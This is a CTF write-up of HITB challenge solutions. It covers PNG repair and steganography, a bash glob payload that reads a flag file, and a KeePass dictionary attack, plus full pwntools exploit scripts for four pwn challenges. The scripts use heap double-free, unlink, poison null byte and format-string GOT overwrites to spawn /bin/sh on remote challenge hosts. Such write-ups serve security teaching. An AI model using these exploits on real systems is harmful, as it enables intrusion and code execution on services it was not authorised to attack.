</code></pre><p>P.S. I think if you find an Arduino Micro, burn the firmware, plug into PC, then you will get the flag in one hour. No reverse needed.</p><h2 id="misc" style=""><a class="anchor hidden-xs" href="#misc" title="misc"><span class="octicon octicon-link"></span></a>misc</h2><h3 id="tpyx-sces60107" style=""><a class="anchor hidden-xs" href="#tpyx-sces60107" title="tpyx-sces60107"><span class="octicon octicon-link"></span></a>tpyx (sces60107)</h3><p>The png file is broken. It seems like We need to fix it first.<br>
<code>pngcheck</code> tell us that it has crc checksum error</p><pre><code class="shell hljs"><span class="hljs-meta">$</span><span class="bash"> pngcheck -v e47c7307-b54c-4316-9894-5a8daec738b4.png </span>
File: e47c7307-b54c-4316-9894-5a8daec738b4.png (1164528 bytes)
  chunk IHDR at offset 0x0000c, length 13
    1024 x 653 image, 32-bit RGB+alpha, non-interlaced
  chunk IDAT at offset 0x00025, length 1162839
    zlib: deflated, 32K window, default compression
  CRC error in chunk IDAT (computed ecfb2a19, expected ba3de214)
ERRORS DETECTED in e47c7307-b54c-4316-9894-5a8daec738b4.png
</code></pre><p>When you try to fix the crc checksum, you will notice that  the size of IDAT chunk is also wrong. The true size is 1164470 not 1162839</p><p>After corrected all faults, just use <code>zsteg</code> to detect any interesting things and also extract them.</p><pre><code class="shell hljs"><span class="hljs-meta">$</span><span class="bash"> zsteg e47c7307-b54c-4316-9894-5a8daec738b4_fixed.png</span>
[?] 1 bytes of extra data after image end (IEND), offset = 0x11c4ef
extradata:imagedata .. file: zlib compressed data
...
...
<span class="hljs-meta">$</span><span class="bash"> zsteg e47c7307-b54c-4316-9894-5a8daec738b4_fixed.png -e extradata:imagedata &gt; zlibdata</span>
<span class="hljs-meta">$</span><span class="bash"> python -c <span class="hljs-string">"import zlib; print zlib.decompress(open('zlibdata').read())"</span> &gt; data</span>
<span class="hljs-meta">$</span><span class="bash"> cat data</span>
377abcaf271c000382f96c91300000000000000073000000000000003c0e24409c429fdb08f31ebc2361b3016f04a79a070830334c68dd47db383e4b7246acad87460cd00ba62cfae68508182a69527a0104060001093000070b0100022406f107010a5307cb7afbfaec5aa07623030101055d0000010001000c2c2700080a01c35b933000000501110b0066006c00610067000000120a010000844bf3571cd101130a010000e669e866d1d301140a010080ffcdd963d1d301150601008000000000001800345172634f556d365761752b5675425838672b4950673d3d
<span class="hljs-meta">$</span><span class="bash"> cat data | xxd -r -p &gt; data</span>
<span class="hljs-meta">$</span><span class="bash"> file data</span>
data.7z: 7-zip archive data, version 0.3

</code></pre><p>Now we have a 7z file, but we need password.<br>
The 7z file is actually appended with the password.</p><pre><code class="shell hljs"><span class="hljs-meta">$</span><span class="bash"> xxd data</span>
00000000: 377a bcaf 271c 0003 82f9 6c91 3000 0000  7z..'.....l.0...
00000010: 0000 0000 7300 0000 0000 0000 3c0e 2440  ....s.......&lt;.$@
00000020: 9c42 9fdb 08f3 1ebc 2361 b301 6f04 a79a  .B......#a..o...
00000030: 0708 3033 4c68 dd47 db38 3e4b 7246 acad  ..03Lh.G.8&gt;KrF..
00000040: 8746 0cd0 0ba6 2cfa e685 0818 2a69 527a  .F....,.....*iRz
00000050: 0104 0600 0109 3000 070b 0100 0224 06f1  ......0......$..
00000060: 0701 0a53 07cb 7afb faec 5aa0 7623 0301  ...S..z...Z.v#..
00000070: 0105 5d00 0001 0001 000c 2c27 0008 0a01  ..].......,'....
00000080: c35b 9330 0000 0501 110b 0066 006c 0061  .[.0.......f.l.a
00000090: 0067 0000 0012 0a01 0000 844b f357 1cd1  .g.........K.W..
000000a0: 0113 0a01 0000 e669 e866 d1d3 0114 0a01  .......i.f......
000000b0: 0080 ffcd d963 d1d3 0115 0601 0080 0000  .....c..........
000000c0: 0000 0018 0034 5172 634f 556d 3657 6175  .....4QrcOUm6Wau
000000d0: 2b56 7542 5838 672b 4950 673d 3d         +VuBX8g+IPg==
<span class="hljs-meta">$</span><span class="bash"> 7z x data -p4QrcOUm6Wau+VuBX8g+IPg==</span>
..
Extracting  flag
..
<span class="hljs-meta">$</span><span class="bash"> cat flag</span>
HITB{0c88d56694c2fb3bcc416e122c1072eb}
</code></pre><h3 id="readfile-sces60107" style=""><a class="anchor hidden-xs" href="#readfile-sces60107" title="readfile-sces60107"><span class="octicon octicon-link"></span></a>readfile (sces60107)</h3><p>It seems like the non-punctuation letter will be filtered.</p><p>So I try to readfile with <code>Arithmetic expansion</code></p><p>The payload is <code>$(&lt;/????/????_??_????/*)</code></p><p>Then we can read the flag <code>HITB{d7dc2f3c59291946abc768d74367ec31}</code></p><h3 id="pix-sces60107" style=""><a class="anchor hidden-xs" href="#pix-sces60107" title="pix-sces60107"><span class="octicon octicon-link"></span></a>pix (sces60107)</h3><p>Use <code>zsteg</code> to extract a keepassX database file</p><pre><code class="shell hljs"><span class="hljs-meta">$</span><span class="bash"> zsteg aee487a2-49cd-4f1f-ada6-b2d398342d99.SteinsGate</span>
imagedata           .. text: " !#865   "
b1,r,msb,xy         .. text: "y5b@2~2t"
b1,rgb,lsb,xy       .. file: Keepass password database 2.x KDBX
b2,r,msb,xy         .. text: "\rP`I$X7D"
b2,bgr,lsb,xy       .. text: "b;d'8H~M"
b4,g,msb,xy         .. text: ";pTr73&amp; dvG:"
<span class="hljs-meta">$</span><span class="bash"> zsteg aee487a2-49cd-4f1f-ada6-b2d398342d99.SteinsGate -e b1,rgb,lsb,xy &gt; keedatabase.kbdx</span>
</code></pre><p>Now we have to launch a dictionary attack against this database. then I found <a href="https://www.rubydevices.com.au/blog/how-to-hack-keepass" target="_blank">this</a></p><p>Finally, I found the password and also found the flag found the flag from the database.</p><p>The flag is <code>HITB{p1x_aNd_k33pass}</code></p><h2 id="pwn" style=""><a class="anchor hidden-xs" href="#pwn" title="pwn"><span class="octicon octicon-link"></span></a>pwn</h2><h3 id="once-kevin47" style=""><a class="anchor hidden-xs" href="#once-kevin47" title="once-kevin47"><span class="octicon octicon-link"></span></a>once (kevin47)</h3><h4 id="Vulnerability"><a class="anchor hidden-xs" href="#Vulnerability" title="Vulnerability"><span class="octicon octicon-link"></span></a>Vulnerability</h4><ul>
<li>Fd and bk of the link list can be overwritten</li>
</ul><h4 id="Exploit"><a class="anchor hidden-xs" href="#Exploit" title="Exploit"><span class="octicon octicon-link"></span></a>Exploit</h4><pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/env python2</span>

<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> IPython <span class="hljs-keyword">import</span> embed
<span class="hljs-keyword">import</span> re

context.arch = <span class="hljs-string">'amd64'</span>

r = remote(<span class="hljs-string">'47.75.189.102'</span>, <span class="hljs-number">9999</span>)
lib = ELF(<span class="hljs-string">'./libc-2.23.so'</span>)

<span class="hljs-comment"># leak</span>
r.sendline(<span class="hljs-string">'0'</span>)
r.recvuntil(<span class="hljs-string">'choice\n'</span>)
x = r.recvuntil(<span class="hljs-string">'&gt;'</span>, drop=<span class="hljs-keyword">True</span>)
libc = int(x, <span class="hljs-number">16</span>) - <span class="hljs-number">0x6f690</span>
lib.address = libc
<span class="hljs-keyword">print</span> hex(libc)

<span class="hljs-comment"># stage 1</span>
<span class="hljs-comment"># overwrite bk</span>
r.sendline(<span class="hljs-string">'2'</span>)
ubin = libc + <span class="hljs-number">0x3c4b70</span><span class="hljs-number">-8</span>+<span class="hljs-number">0x10</span>+<span class="hljs-number">8</span>
r.send(flat(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">0x101</span>, <span class="hljs-number">0xdeadbeef</span>, ubin))
r.sendlineafter(<span class="hljs-string">'&gt;'</span>, <span class="hljs-string">'1'</span>)
<span class="hljs-comment"># unlink</span>
r.sendlineafter(<span class="hljs-string">'&gt;'</span>, <span class="hljs-string">'3'</span>)   <span class="hljs-comment"># ubin -&gt; bss</span>

<span class="hljs-comment"># stage 2</span>
<span class="hljs-comment">#r.sendline('4')</span>
r.sendlineafter(<span class="hljs-string">'&gt;'</span>, <span class="hljs-string">'4'</span>)
<span class="hljs-comment"># alloc on bss</span>
r.sendlineafter(<span class="hljs-string">'&gt;'</span>, <span class="hljs-string">'1'</span>)
r.sendlineafter(<span class="hljs-string">'size:'</span>, str(<span class="hljs-number">0x100</span><span class="hljs-number">-8</span>))
<span class="hljs-comment"># write bss</span>
stdout, stdin = libc+<span class="hljs-number">0x3c5620</span>, libc+<span class="hljs-number">0x3c48e0</span>
binsh = libc+<span class="hljs-number">1625367</span>
payload = [
    <span class="hljs-number">0</span>, lib.symbols[<span class="hljs-string">'__free_hook'</span>],     <span class="hljs-comment"># link list bk to overwrite free hook</span>
    stdout, <span class="hljs-number">0</span>,
    stdin, <span class="hljs-number">0</span>,
    <span class="hljs-number">0</span>, binsh,     <span class="hljs-comment"># ptr containing "/bin/sh"</span>
    [<span class="hljs-number">0</span>]*<span class="hljs-number">10</span>,     <span class="hljs-comment"># flags = 0</span>
]
r.sendlineafter(<span class="hljs-string">'&gt;'</span>, <span class="hljs-string">'2'</span>)
r.send(flat(payload))
<span class="hljs-comment"># we can edit1 again :), plus bk is on free hook</span>
<span class="hljs-comment"># back to stage 1</span>
r.sendlineafter(<span class="hljs-string">'&gt;'</span>, <span class="hljs-string">'4'</span>)

<span class="hljs-comment"># ovewrite free_hook</span>
r.sendlineafter(<span class="hljs-string">'&gt;'</span>, <span class="hljs-string">'2'</span>)
r.send(flat(lib.symbols[<span class="hljs-string">'system'</span>]))

<span class="hljs-comment"># stage 2</span>
r.sendlineafter(<span class="hljs-string">'&gt;'</span>, <span class="hljs-string">'4'</span>)
<span class="hljs-comment"># free(ptr) == system("/bin/sh")</span>
r.sendlineafter(<span class="hljs-string">'&gt;'</span>, <span class="hljs-string">'3'</span>)


r.interactive()

<span class="hljs-comment"># HITB{this_is_the_xxxxxxx_flag}</span>
</code></pre><h3 id="gundam-kevin47" style=""><a class="anchor hidden-xs" href="#gundam-kevin47" title="gundam-kevin47"><span class="octicon octicon-link"></span></a>gundam (kevin47)</h3><h4 id="Overview"><a class="anchor hidden-xs" href="#Overview" title="Overview"><span class="octicon octicon-link"></span></a>Overview</h4><pre><code>Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
</code></pre><p>There are 4 operations:</p><ol>
<li>Build a gundam</li>
<li>Visit gundams</li>
<li>Destroy a gundam</li>
<li>Blow up the factory</li>
</ol><p>The structure of a gundam is:</p><pre><code>     +---------+
     |flag     |              0x100
     +---------+     +--------------------+
     |name_ptr |----&gt;|        name        |   
0x28 +---------+     +--------------------+
     |type(str)|
     |         |
     |         |
     +---------|
</code></pre><ul>
<li>An array of pointer to the gundam structure is on bss.</li>
<li>When a gundam is builded, the program malloc chunks of size 0x28 and 0x100 as shown above, set them properly, and store into the array of pointer on bss.</li>
<li>Visit gundams prints gundams’ index, name and type that are not destroyed.</li>
<li>Destroy a gundam sets the flag to 0 and frees the name</li>
<li>Blow up the factory frees the gundam structures that flag are 0.</li>
</ul><h4 id="Vulnerability1"><a class="anchor hidden-xs" href="#Vulnerability1" title="Vulnerability1"><span class="octicon octicon-link"></span></a>Vulnerability</h4><ul>
<li>Read name without ending null byte, which can be used to leak.</li>
<li>Destroy a gundam does not clear the name_ptr, which leads to use after free (double free).</li>
<li>The program is running with libc-2.26, which implemented a new feature called tcache to improve performance. However, it does not perform any sanity check for performance’s sake. That is, fastbin dup attack  can be done anywhere any size without satisfying the size’s contraint.</li>
</ul><h4 id="Leak"><a class="anchor hidden-xs" href="#Leak" title="Leak"><span class="octicon octicon-link"></span></a>Leak</h4><ul>
<li>Leaking libc addres will be a little bit more complicated than older versions of libc, since tache acts like fastbins and only have heap address on it.</li>
<li>However, tcache has a maximun of 7 chunks. By freeing more than 7 chunks, the remaining chunks will be treated as usual. That is, the chunks of size 0x100 will be at unsorted bins and small bins rather than tache, which contains libc address.</li>
</ul><h4 id="Exploit1"><a class="anchor hidden-xs" href="#Exploit1" title="Exploit1"><span class="octicon octicon-link"></span></a>Exploit</h4><ul>
<li>Leak libc and heap addresses.</li>
<li>Use fastbin dup attack to malloc a chunk on <strong>&amp;__free_hook</strong>. Note that in older version of libc we have to <code>free(a); free(b); free(a);</code> to bypass double free check. But tache doesn’t check, so it can be done simply by <code>free(a); free(a);</code></li>
<li>Overwrite <strong>__free_hook</strong> to <strong>system</strong>. After that, Destroying a gundam with the name <code>/bin/sh</code>, which calls <code>free(name)</code> will be converted to <code>system("/bin/sh")</code></li>
</ul><pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/env python2</span>

<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> IPython <span class="hljs-keyword">import</span> embed
<span class="hljs-keyword">import</span> re

context.arch = <span class="hljs-string">'amd64'</span>

r = remote(<span class="hljs-string">'47.75.37.114'</span>, <span class="hljs-number">9999</span>)
lib = ELF(<span class="hljs-string">'./libc.so.6'</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build</span><span class="hljs-params">(name, typee)</span>:</span>
    r.sendlineafter(<span class="hljs-string">'choice : '</span>, <span class="hljs-string">'1'</span>)
    r.sendafter(<span class="hljs-string">'gundam :'</span>, name)
    r.sendlineafter(<span class="hljs-string">'gundam :'</span>, str(typee))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">visit</span><span class="hljs-params">()</span>:</span>
    r.sendlineafter(<span class="hljs-string">'choice : '</span>, <span class="hljs-string">'2'</span>)
    <span class="hljs-keyword">return</span> r.recvuntil(<span class="hljs-string">'1 . Build'</span>, drop=<span class="hljs-keyword">True</span>)

<span class="hljs-comment"># double free</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">destroy</span><span class="hljs-params">(idx)</span>:</span>
    r.sendlineafter(<span class="hljs-string">'choice : '</span>, <span class="hljs-string">'3'</span>)
    r.sendlineafter(<span class="hljs-string">'Destory:'</span>, str(idx))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">blow_up</span><span class="hljs-params">()</span>:</span>
    r.sendlineafter(<span class="hljs-string">'choice : '</span>, <span class="hljs-string">'4'</span>)


<span class="hljs-comment"># leak</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">9</span>):
    build(chr(<span class="hljs-number">0x11</span>*(i+<span class="hljs-number">1</span>))*<span class="hljs-number">16</span>, <span class="hljs-number">0</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):
    destroy(i)
blow_up()
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):
    build(chr(<span class="hljs-number">0x11</span>*(i+<span class="hljs-number">1</span>)), <span class="hljs-number">0</span>)
build(<span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>, <span class="hljs-number">0</span>)
x = visit()
xx = re.findall(<span class="hljs-string">'0\] :(.*)Type\[0'</span>, x, re.DOTALL)[<span class="hljs-number">0</span>]
heap = u64(xx.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0x811</span>
xx = re.findall(<span class="hljs-string">'aaaaaaaa(.*)Type\[7'</span>, x, re.DOTALL)[<span class="hljs-number">0</span>]
libc = u64(xx.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0x3dac78</span>
lib.address = libc
<span class="hljs-keyword">print</span> hex(heap)
<span class="hljs-keyword">print</span> hex(libc)

<span class="hljs-comment"># exploit</span>
<span class="hljs-comment"># trigger double free libc 2.26 doesn't do any sanity check on tcache</span>
<span class="hljs-comment"># libc 2.26 is awesome!!</span>
destroy(<span class="hljs-number">2</span>)
destroy(<span class="hljs-number">1</span>)
destroy(<span class="hljs-number">0</span>)
destroy(<span class="hljs-number">0</span>)
blow_up()
build(flat(lib.symbols[<span class="hljs-string">'__free_hook'</span>]), <span class="hljs-number">0</span>)
build(<span class="hljs-string">'/bin/sh\x00'</span>, <span class="hljs-number">0</span>)
build(flat(lib.symbols[<span class="hljs-string">'system'</span>]), <span class="hljs-number">0</span>)
destroy(<span class="hljs-number">1</span>)

<span class="hljs-comment">#embed()</span>
r.interactive()

<span class="hljs-comment"># HITB{now_you_know_about_tcache}</span>
</code></pre><h3 id="d-kevin47" style=""><a class="anchor hidden-xs" href="#d-kevin47" title="d-kevin47"><span class="octicon octicon-link"></span></a>d (kevin47)</h3><h4 id="Overview1"><a class="anchor hidden-xs" href="#Overview1" title="Overview1"><span class="octicon octicon-link"></span></a>Overview</h4><pre><code>Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
</code></pre><p>There are 3 operations:</p><ol>
<li>Read message</li>
<li>Edit message</li>
<li>Wipe message</li>
</ol><ul>
<li>On read message, we enter a base64 encoded string, the program decodes it and stores in the heap, with ending null byte</li>
<li>Edit message read <code>strlen(message)</code> bytes to the message.</li>
<li>Wipe message frees the message and clears the pointer</li>
</ul><h4 id="Vulnerability2"><a class="anchor hidden-xs" href="#Vulnerability2" title="Vulnerability2"><span class="octicon octicon-link"></span></a>Vulnerability</h4><ul>
<li>Base64 decode does not check the length properly. If we send <code>'YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQ'</code> which is <code>base64encode('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')</code> without the ending <code>'=='</code>, the decoder miscalculates the length of the string, which leads to no ending null byte. Edit message then could be used to overwrite next chunk’s size.</li>
</ul><h4 id="Exploit2"><a class="anchor hidden-xs" href="#Exploit2" title="Exploit2"><span class="octicon octicon-link"></span></a>Exploit</h4><ul>
<li>Use poinson null byte to create overlapped chunks.</li>
<li>Use fastbin dup attack to malloc a chunk on bss, where the pointers are.</li>
<li>We can overwrite the pointers, which leads into arbitrary memory write.</li>
<li>Change free@got to puts@plt, this enable us to leak libc address.</li>
<li>Change atoi@got to system. After this, when reading choice we can enter <code>/bin/sh</code>, which calls <code>atoi(buf)</code> that is <code>system('/bin/sh')</code> now.</li>
</ul><pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/env python2</span>

<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> IPython <span class="hljs-keyword">import</span> embed
<span class="hljs-keyword">import</span> re

context.arch = <span class="hljs-string">'amd64'</span>

r = remote(<span class="hljs-string">'47.75.154.113'</span>, <span class="hljs-number">9999</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new_msg</span><span class="hljs-params">(idx, content)</span>:</span>
    r.sendlineafter(<span class="hljs-string">'Which? :'</span>, <span class="hljs-string">'1'</span>)
    r.sendlineafter(<span class="hljs-string">'Which? :'</span>, str(idx))
    r.sendlineafter(<span class="hljs-string">'msg:'</span>, content)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit_msg</span><span class="hljs-params">(idx, content, pwn=<span class="hljs-number">0</span>)</span>:</span>
    r.sendlineafter(<span class="hljs-string">'Which? :'</span>, <span class="hljs-string">'2'</span>)
    r.sendlineafter(<span class="hljs-string">'Which? :'</span>, str(idx))
    <span class="hljs-keyword">if</span> pwn:
        r.sendafter(<span class="hljs-string">'msg:'</span>, content)
    <span class="hljs-keyword">else</span>:
        r.sendlineafter(<span class="hljs-string">'msg:'</span>, content)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">del_msg</span><span class="hljs-params">(idx)</span>:</span>
    r.sendlineafter(<span class="hljs-string">'Which? :'</span>, <span class="hljs-string">'3'</span>)
    r.sendlineafter(<span class="hljs-string">'Which? :'</span>, str(idx))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">b64e</span><span class="hljs-params">(c)</span>:</span>
    <span class="hljs-keyword">return</span> c.encode(<span class="hljs-string">'base64'</span>).replace(<span class="hljs-string">'\n'</span>, <span class="hljs-string">''</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp_new_msg</span><span class="hljs-params">(idx, content)</span>:</span>
    b64 = b64e(content)
    <span class="hljs-keyword">if</span> b64[<span class="hljs-number">-2</span>] == <span class="hljs-string">'='</span>:
        new_msg(idx, b64[:<span class="hljs-number">-2</span>])
    <span class="hljs-keyword">elif</span> b64[<span class="hljs-number">-1</span>] == <span class="hljs-string">'='</span>:
        new_msg(idx, b64[:<span class="hljs-number">-1</span>])
    <span class="hljs-keyword">else</span>:
        new_msg(idx, b64)

<span class="hljs-comment"># 40 &amp; 41 are the magic numbers :)</span>
exp_new_msg(<span class="hljs-number">0</span>, <span class="hljs-string">'a'</span>*<span class="hljs-number">40</span>)
new_msg(<span class="hljs-number">1</span>, b64e(<span class="hljs-string">'a'</span>*<span class="hljs-number">0x203</span>))
new_msg(<span class="hljs-number">2</span>, b64e(<span class="hljs-string">'a'</span>*<span class="hljs-number">0x100</span>))
edit_msg(<span class="hljs-number">1</span>, flat(
    [<span class="hljs-number">0xdeadbeef</span>]*<span class="hljs-number">28</span>,
    <span class="hljs-number">0xf0</span>, <span class="hljs-number">0x20</span>,
    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,
    [<span class="hljs-number">0xaabbccdd</span>]*<span class="hljs-number">30</span>,
    <span class="hljs-number">0x200</span>, <span class="hljs-number">0x120</span>,
))

<span class="hljs-comment"># overflow 1's size (unsorted bin)</span>
del_msg(<span class="hljs-number">1</span>)
edit_msg(<span class="hljs-number">0</span>, <span class="hljs-string">'a'</span>*<span class="hljs-number">40</span>)

new_msg(<span class="hljs-number">3</span>, b64e(<span class="hljs-string">'b'</span>*<span class="hljs-number">0x100</span>))
new_msg(<span class="hljs-number">4</span>, b64e(<span class="hljs-string">'c'</span>*<span class="hljs-number">0x60</span>))
del_msg(<span class="hljs-number">3</span>)
del_msg(<span class="hljs-number">2</span>)
<span class="hljs-comment"># for fastbin attack</span>
del_msg(<span class="hljs-number">4</span>)

<span class="hljs-comment"># overlapped chunks, overwrite fastbin-&gt;fd</span>
new_msg(<span class="hljs-number">5</span>, b64e(<span class="hljs-string">'d'</span>*<span class="hljs-number">0x200</span>))
fast_bin_addr = <span class="hljs-number">0x60216d</span>
edit_msg(<span class="hljs-number">5</span>, flat(
    [<span class="hljs-number">0</span>]*<span class="hljs-number">32</span>,
    <span class="hljs-number">0</span>, <span class="hljs-number">0x71</span>,
    fast_bin_addr,
))

new_msg(<span class="hljs-number">6</span>, b64e(<span class="hljs-string">'a'</span>*<span class="hljs-number">0x60</span>))
<span class="hljs-comment"># on bss</span>
new_msg(<span class="hljs-number">60</span>, b64e(<span class="hljs-string">'A'</span>*<span class="hljs-number">0x60</span>))
free_got = <span class="hljs-number">0x602018</span>
strlen_got = <span class="hljs-number">0x602028</span>
atoi_got = <span class="hljs-number">0x602068</span>
puts_plt = <span class="hljs-number">0x400770</span>
alarm_plt = <span class="hljs-number">0x4007b0</span>
edit_msg(<span class="hljs-number">60</span>, <span class="hljs-string">'BBB'</span>+flat(free_got, atoi_got, atoi_got, strlen_got))

<span class="hljs-comment"># free -&gt; puts</span>
edit_msg(<span class="hljs-number">0</span>, flat(puts_plt))
<span class="hljs-comment"># free(1) == puts(atoi_got)</span>
del_msg(<span class="hljs-number">1</span>)
x = r.recvuntil(<span class="hljs-string">'1. read'</span>)
xx = x[<span class="hljs-number">8</span>:<span class="hljs-number">14</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>)
libc = u64(xx)<span class="hljs-number">-0x36e80</span>
system = libc + <span class="hljs-number">0x45390</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">'libc:'</span>, hex(libc)

<span class="hljs-comment"># strlen -&gt; alarm to bypass read_n len restriction</span>
edit_msg(<span class="hljs-number">3</span>, flat(alarm_plt))
<span class="hljs-comment"># atoi -&gt; system</span>
edit_msg(<span class="hljs-number">2</span>, flat(system)[:<span class="hljs-number">-1</span>])
r.sendline(<span class="hljs-string">'/bin/sh'</span>)

r.interactive()

<span class="hljs-comment"># HITB{b4se364_1s_th3_b3st_3nc0d1ng!}</span>
</code></pre><h3 id="babypwn-how2hack" style=""><a class="anchor hidden-xs" href="#babypwn-how2hack" title="babypwn-how2hack"><span class="octicon octicon-link"></span></a>babypwn (how2hack)</h3><h4 id="Vulnerability3"><a class="anchor hidden-xs" href="#Vulnerability3" title="Vulnerability3"><span class="octicon octicon-link"></span></a>Vulnerability</h4><p>A challenge with format string vulnerability without given binary.</p><h4 id="Solution"><a class="anchor hidden-xs" href="#Solution" title="Solution"><span class="octicon octicon-link"></span></a>Solution</h4><p>My first intuition is to find the <code>.got.plt</code> section and overwrite something into <code>system</code>. As the binary has no PIE enabled (can find out by leaking some address out and you will notice there are a lot of address start with <code>0x40XXXX</code> or <code>0x60XXXX</code>), we can guess the <code>.got.plt</code> section is around <code>0x601000</code>.</p><pre><code>0x601000 0x202020600e20
0x601008 0x7fb6b4617168
0x601010 0x7fb6b4407870
0x601018 0x7fb6b409c6b0
0x601020 0x102020202020 # ????
0x601028 0x7fb6b4094d80
0x601030 0x7fb6b4123d60
</code></pre><p>I was unable to leak <code>0x601020</code> for some reason.<br>
I try to leak the called functions as well.</p><pre><code>0x4003c5 gets    ?@
0x4003ca stdin    ?@
0x4003d0 printf    ?@
0x4003d7 stdout    ?@
0x4003de stderr    ?@
0x4003e5 usleep    ?@
0x4003ea setbuf    ?@
0x4003f1 __libc_start_main    ?@
</code></pre><p>Then I have to leak the libc version, but I am too lazy to do it so I try to find my local libc and check for the offset.</p><pre><code>gets: 0x6ed80    (0x601028)
printf: 0x55800  (0x601020)?
usleep: 0xfdd60  (0x601030)
</code></pre><p>Now I understand why <code>0x601020</code> was unable to leak because of the null byte of its offset. I confirmed this by checking <code>0x601021</code> and I got this:</p><pre><code>0x601021 0x7f3e9ac0d8 (end with '8', so the offset should be '800')
</code></pre><p>Finally, overwrite <code>printf</code> to <code>system</code> then we get the shell.</p><h4 id="Exploit3"><a class="anchor hidden-xs" href="#Exploit3" title="Exploit3"><span class="octicon octicon-link"></span></a>Exploit</h4><pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/env python</span>

<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

host = <span class="hljs-string">'47.75.182.113'</span>
port = <span class="hljs-number">9999</span>

r = remote(host, port)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt</span><span class="hljs-params">(prev, word, index)</span>:</span>
    <span class="hljs-keyword">if</span> prev &lt; word:
        result = word - prev
        fmtstr = <span class="hljs-string">'%'</span> + str(result) + <span class="hljs-string">'c'</span>
    <span class="hljs-keyword">elif</span> prev == word:
        result = <span class="hljs-number">0</span>
    <span class="hljs-keyword">else</span>:
        result = <span class="hljs-number">256</span> - prev + word
        fmtstr = <span class="hljs-string">'%'</span> + str(result) + <span class="hljs-string">'c'</span>
    fmtstr += <span class="hljs-string">'%'</span> + str(index) + <span class="hljs-string">'$hhn'</span>
    <span class="hljs-keyword">return</span> fmtstr

sleep(<span class="hljs-number">5</span>)

system_off = <span class="hljs-number">0x45390</span>
printf_plt = <span class="hljs-number">0x601020</span>
gets_plt = <span class="hljs-number">0x601028</span>
gets_off = <span class="hljs-number">0x6ed80</span>

payload = <span class="hljs-string">'%7$s    '</span> + p64(gets_plt)
r.sendline(payload)
gets = u64(r.recv(<span class="hljs-number">1000</span>, timeout=<span class="hljs-number">1</span>)[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>))
<span class="hljs-keyword">print</span> <span class="hljs-string">'gets:'</span>, hex(gets)

libc = gets - gets_off
<span class="hljs-keyword">print</span> <span class="hljs-string">'libc:'</span>, hex(libc)

system = libc + system_off
<span class="hljs-keyword">print</span> <span class="hljs-string">'system:'</span>, hex(system)

payload = <span class="hljs-string">''</span>
prev = <span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):
    payload += fmt(prev, (system &gt;&gt; <span class="hljs-number">8</span> * i) &amp; <span class="hljs-number">0xff</span>, <span class="hljs-number">11</span> + i)
    prev = (system &gt;&gt; <span class="hljs-number">8</span> * i) &amp; <span class="hljs-number">0xff</span>

payload += <span class="hljs-string">'A'</span>*(<span class="hljs-number">8</span> - (len(payload) % <span class="hljs-number">8</span>))
payload += p64(printf_plt) + p64(printf_plt+<span class="hljs-number">1</span>) + p64(printf_plt+<span class="hljs-number">2</span>)

r.sendline(payload)

r.recv(<span class="hljs-number">1000</span>)
sleep(<span class="hljs-number">1</span>)

r.sendline(<span class="hljs-string">'/bin/sh'</span>)
r.sendline(<span class="hljs-string">'cat flag'</span>)
flag = r.recvline()

log.success(<span class="hljs-string">'FLAG: '</span> + flag)
</code></pre><pre><code>[+] Opening connection to 47.75.182.113 on port 9999: Done
gets: 0x7f99aca0dd80
libc: 0x7f99ac99f000
system: 0x7f99ac9e4390
[+] FLAG: HITB{Baby_Pwn_BabY_bl1nd}
[*] Closed connection to 47.75.182.113 port 9999
